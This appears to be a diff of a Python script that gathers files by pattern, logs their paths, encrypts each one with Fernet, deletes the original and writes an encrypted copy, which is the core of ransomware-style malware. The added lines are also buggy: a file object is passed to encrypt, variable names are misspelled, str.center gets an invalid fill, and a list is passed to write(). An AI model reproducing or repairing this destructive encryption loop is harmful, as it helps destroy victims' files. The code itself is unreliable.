@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 from pconst import const
 import re
 import time
-import subprocess
+import subprocess 
 import getpass
 import datetime  
 import csv
@@ -41,15 +41,21 @@ for file_name in file_list:
 		if re.search(formt , file_name) != None:
 			files_path.append(file_name)
 			
-
+pathes = open(path+'/'+'pathes.txt' , 'a')
+msg =f'''
+PATHES OF FILES: {files_path}############ \n time: {current_time}
+'''
+pathes.write(files_path)
+pathes.close()
 for file_path in files_path:
 	try:
 		with open(file_path,'rb+') as texted_file:
 			crypetd_texted_file = f.encrypt(texted_file)
-		
+		print(file_path , 'CRYPTED'.center(10,'_'))
 		os.remove(file_path)
-		with open(file_path+'[CRYPTED]'.center(20,'_' , 'w') as crypted_file:
+		with open(file_path+'[ENCRYPTED'.center(20,'__') , 'w') as crypted_file:
 			crypted_file.write(crypted_texted_file)
+			
 			
 			
 	
